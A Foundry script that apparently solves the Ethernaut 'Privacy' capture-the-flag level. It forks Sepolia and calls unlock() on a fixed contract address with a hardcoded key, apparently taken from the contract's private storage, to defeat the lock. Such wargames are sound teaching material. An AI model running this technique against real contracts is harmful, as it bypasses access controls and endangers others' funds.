// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

import {Privacy} from "../src/Privacy.sol";

contract StakeScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address privacyContractAddress = 0xB709c11a0DB4fD3C9eBF35E123a07661666A45f3;
        Privacy instance = Privacy(privacyContractAddress);

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        require(instance.locked() == true, "Initial State");

        bytes32 data = 0x41f0972d609ac04f284ca8c56ce441e257a7534a5df7da2b627c3d501c22b789;

        instance.unlock(bytes16(data));

        require(instance.locked() == false, "Final State");

        vm.stopBroadcast();
    }
}
